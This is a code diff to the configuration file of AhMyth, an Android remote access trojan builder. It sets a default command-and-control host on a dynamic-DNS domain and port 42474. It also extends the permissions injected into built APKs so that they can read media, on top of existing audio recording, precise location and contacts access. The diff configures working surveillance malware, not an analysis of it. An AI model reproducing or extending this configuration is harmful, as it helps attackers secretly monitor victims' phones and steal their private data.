@@ -10,9 +10,12 @@ exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replac
 exports.dataDir = 'AhMyth'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
+// Lưu APK build vào ngay trong dự án (dễ theo dõi)
+exports.projectOutputPath = path.join(exports.ahmythApkFolderPath, '..', 'Output');
 exports.logColors = { RED: "red", GREEN: "green", DEFAULT: "white" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0 };
 exports.defaultPort = 42474;
+exports.defaultHost = 'ahmythserver.duckdns.org';
 exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/IOSocket.smali';
 exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
 exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
@@ -46,7 +49,11 @@ exports.permissions = [
     '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
     '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
     '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
-    '<uses-permission android:name="android.permission.READ_CONTACTS" />'
+    '<uses-permission android:name="android.permission.READ_CONTACTS" />',
+    '<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />',
+    '<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />',
+    '<uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />',
+    '<uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />'
 ]
 
 
